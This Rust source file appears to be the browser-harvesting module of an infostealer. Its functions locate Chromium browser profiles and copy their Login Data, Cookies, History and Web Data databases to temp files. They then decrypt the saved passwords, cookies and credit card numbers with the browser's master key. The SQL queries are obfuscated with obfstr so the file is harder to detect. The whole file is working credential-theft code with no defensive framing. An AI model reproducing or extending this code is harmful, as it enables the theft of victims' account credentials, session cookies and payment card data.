use super::crypto;
use crate::browser::common::{Login, Card, History, get_browser_name};
use crate::browser::common::chromium::{get_user_data_dir, get_profile_names, get_profile_path};
use crate::browser::browsers::chromium::{get_targets};

use rusqlite::{Connection, OpenFlags};
use std::{
    env,
    fs::{self},
    path::{Path},
};

use std::collections::HashMap;

use uuid::Uuid;

pub fn get_passwords() -> Vec<Login> {
    let mut passwords: Vec<Login> = Vec::new();

    let userprofile_env = env::var("USERPROFILE").unwrap();
    let appdata_dir = Path::new(userprofile_env.as_str()).join("AppData");

    for chromunium_target in get_targets() {
        let chromunium_dir = appdata_dir.join(chromunium_target);

        let browser_name = get_browser_name(chromunium_dir.clone());

        if !chromunium_dir.exists() {
            continue;
        }

        let user_data_dir = get_user_data_dir(&chromunium_dir);
        let profiles = get_profile_names(&user_data_dir);
        let temp_path = std::env::temp_dir().join(Uuid::new_v4().to_string());

        let local_state_path = user_data_dir.join("Local State");

        if !local_state_path.exists() {
            continue;
        }

        let master_key = match crypto::chromium::get_master_key(&local_state_path) {
            Some(master_key) => master_key,
            None => continue,
        };

        for profile in profiles {    
            let profile_path = get_profile_path(&user_data_dir, profile.clone());
            let login_data_path = profile_path.join("Login Data");
    
            if !login_data_path.exists() {
                continue;
            }
    
            
            fs::copy(login_data_path, &temp_path).unwrap();
    
            let conn =
                Connection::open_with_flags(&temp_path, OpenFlags::SQLITE_OPEN_READ_ONLY).unwrap();
    
            let mut stmt = conn
                .prepare(obfstr::obfstr!(
                    "SELECT origin_url, username_value, password_value FROM logins"
                ))
                .unwrap();
    
            let mut rows = stmt.query([]).unwrap();
    
            while let Some(row) = rows.next().unwrap() {
                let origin_url: String = row.get(0).unwrap();
                let username: String = row.get(1).unwrap();
                let password_value = row.get(2).unwrap();
    
                let password = crypto::chromium::aes_decrypt(password_value, &master_key);
    
                passwords.push(Login{
                    browser: browser_name.clone(),
                    profile: profile.clone(),
                    url: origin_url,
                    username: username,
                    password: std::str::from_utf8(&password).unwrap().to_string()
                });
            }
    
            drop(rows);
            stmt.finalize().unwrap();
            conn.close().unwrap();
        }

        
        fs::remove_file(temp_path).unwrap();
    }

    passwords
}

pub fn get_cookies() -> HashMap<String, Vec<String>> {
    let mut cookies: HashMap<String, Vec<String>> = HashMap::new();

    let userprofile_env = env::var("USERPROFILE").unwrap();
    let appdata_dir = Path::new(userprofile_env.as_str()).join("AppData");

    for chromunium_target in get_targets() {
        let chromunium_dir = appdata_dir.join(chromunium_target);

        let browser_name = get_browser_name(chromunium_dir.clone());

        if !chromunium_dir.exists() {
            continue;
        }

        let user_data_dir = get_user_data_dir(&chromunium_dir);
        let profiles = get_profile_names(&user_data_dir);

        let local_state_path = user_data_dir.join("Local State");

        if !local_state_path.exists() {
            continue;
        }

        let master_key = match crypto::chromium::get_master_key(&local_state_path) {
            Some(master_key) => master_key,
            None => continue,
        };

        for profile in profiles {
            let profile_path = get_profile_path(&user_data_dir, profile.clone());
            let cookies_path = profile_path.join("Network").join("Cookies");
    
            if !cookies_path.exists() {
                continue;
            }
    
            let mut temp_cookies: Vec<String> = Vec::new();
            let temp_path = std::env::temp_dir().join(Uuid::new_v4().to_string());
            fs::copy(cookies_path, &temp_path).unwrap();

            let conn =
                Connection::open_with_flags(&temp_path, OpenFlags::SQLITE_OPEN_READ_ONLY).unwrap();
    
            let mut stmt = conn
                .prepare(obfstr::obfstr!(
                    "SELECT host_key, samesite, path, is_secure, expires_utc, name, encrypted_value FROM cookies"
                ))
                .unwrap();
    
            let mut rows = stmt.query([]).unwrap();
    
            while let Some(row) = rows.next().unwrap() {
                let host_key: String = row.get(0).unwrap();
                let samesite: i64 = row.get(1).unwrap();
                let path: String = row.get(2).unwrap();
                let is_secure: i64 = row.get(3).unwrap();
                let expires_utc: i64 = row.get(4).unwrap();
                let name: String = row.get(5).unwrap();
                let encrypted_value = row.get(6).unwrap();
    
                // convert is secure to bool string
                let is_secure = if is_secure == 1 { "TRUE" } else { "FALSE" };
    
                // compute epoch time
                let expiry = (expires_utc - 11644473600000000) / 1000000;
                //check if expiry is negative
                let expiry = if expiry < 0 { 0 } else { expiry };
    
                let value = crypto::chromium::aes_decrypt(encrypted_value, &master_key);
    
                let samesite = if samesite == 1 { "TRUE" } else { "FALSE" };
    
                let cookie = format!(
                    "{}\t{}\t{}\t{}\t{}\t{}\t{}",
                    host_key,
                    samesite,
                    path,
                    is_secure,
                    expiry,
                    name,
                    std::str::from_utf8(&value).unwrap()
                );
    
                temp_cookies.push(cookie);
            }
            let name = "[".to_owned() + &profile + "]" + &browser_name;
            cookies.insert(name.clone(), temp_cookies.clone());
            drop(rows);
            stmt.finalize().unwrap();
            conn.close().unwrap();
            fs::remove_file(temp_path).unwrap();
        }
    }

    cookies
}

pub fn get_history() -> Vec<History> {
    let mut history: Vec<History> = Vec::new();

    let userprofile_env = env::var("USERPROFILE").unwrap();
    let appdata_dir = Path::new(userprofile_env.as_str()).join("AppData");

    for chromunium_target in get_targets() {
        let chromunium_dir = appdata_dir.join(chromunium_target);

        if !chromunium_dir.exists() {
            continue;
        }

        let user_data_dir = get_user_data_dir(&chromunium_dir);
        let profiles = get_profile_names(&user_data_dir);
        let temp_path = std::env::temp_dir().join(Uuid::new_v4().to_string());

        for profile in profiles {
            let default_path = get_profile_path(&user_data_dir, profile);
            let history_path = default_path.join("History");
    
            if !history_path.exists() {
                continue;
            }
    
            
            fs::copy(history_path, &temp_path).unwrap();
    
            let conn =
                Connection::open_with_flags(&temp_path, OpenFlags::SQLITE_OPEN_READ_ONLY).unwrap();
    
            let mut stmt = conn
                .prepare(obfstr::obfstr!("SELECT title, url, visit_count FROM urls"))
                .unwrap();
            let mut rows = stmt.query([]).unwrap();
    
            while let Some(row) = rows.next().unwrap() {
                let title: String = row.get(0).unwrap();
                let url: String = row.get(1).unwrap();
                let visit_count: u32 = row.get(2).unwrap();
    
                history.push(History {
                    title,
                    url,
                    visit_count,
                });
            }
    
            drop(rows);
            stmt.finalize().unwrap();
            conn.close().unwrap();
        }

        
        fs::remove_file(temp_path).unwrap();
    }

    history
}

pub fn get_cc() -> Vec<Card> {
    let mut credit_cards:Vec<Card> = Vec::new();

    let userprofile_env = env::var("USERPROFILE").unwrap();
    let appdata_dir = Path::new(userprofile_env.as_str()).join("AppData");

    for chromunium_target in get_targets() {
        let chromunium_dir = appdata_dir.join(chromunium_target);

        let browser_name = get_browser_name(chromunium_dir.clone());

        if !chromunium_dir.exists() {
            continue;
        }

        let user_data_dir = get_user_data_dir(&chromunium_dir);
        let profiles = get_profile_names(&user_data_dir);
        let temp_path = std::env::temp_dir().join(Uuid::new_v4().to_string());

        let local_state_path = user_data_dir.join("Local State");

        if !local_state_path.exists() {
            continue;
        }

        let master_key = match crypto::chromium::get_master_key(&local_state_path) {
            Some(master_key) => master_key,
            None => continue,
        };

        for profile in profiles {
            let default_path = get_profile_path(&user_data_dir, profile.clone());
            let credit_cards_path = default_path.join("Web Data");
    
            if !credit_cards_path.exists() {
                continue;
            }
    
    
            fs::copy(credit_cards_path, &temp_path).unwrap();
    
            let conn =
                Connection::open_with_flags(&temp_path, OpenFlags::SQLITE_OPEN_READ_ONLY).unwrap();
    
            let mut stmt = conn.prepare(obfstr::obfstr!("SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards")).unwrap();
    
            let mut rows = stmt.query([]).unwrap();
    
            while let Some(row) = rows.next().unwrap() {
                let name_on_card: String = row.get(0).unwrap();
                let expiration_month: i32 = row.get(1).unwrap();
                let expiration_year: i32 = row.get(2).unwrap();
                let card_number_encrypted = row.get(3).unwrap();
    
                let card_number = crypto::chromium::aes_decrypt(card_number_encrypted, &master_key);
    
                let expiration = format!("{}/{}", expiration_month, expiration_year);
    
                credit_cards.push(Card {
                    browser: browser_name.clone(),
                    profile: profile.clone(),
                    name: name_on_card,
                    number: std::str::from_utf8(&card_number).unwrap().to_string(),
                    exp: expiration,
                });

            }
    
            drop(rows);
            stmt.finalize().unwrap();
            conn.close().unwrap();
        }
        
        fs::remove_file(temp_path).unwrap();
    }

    credit_cards
}
